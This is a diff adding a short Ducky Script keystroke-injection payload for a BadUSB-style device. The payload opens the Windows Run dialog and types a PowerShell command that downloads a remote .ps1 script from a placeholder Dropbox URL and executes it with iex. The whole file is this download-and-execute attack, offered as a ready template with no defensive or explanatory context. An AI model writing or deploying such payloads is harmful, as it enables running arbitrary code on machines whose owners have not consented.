@@ -1,0 +1,5 @@
+GUI r
+DELAY 500
+ALTSTRING cmd /c powershell iex ((New-Object System.Net.WebClient).DownloadString('< Dropbox download URL ending with "?dl=1", with the .ps1 file you want to run >'))
+ENTER
+REM 
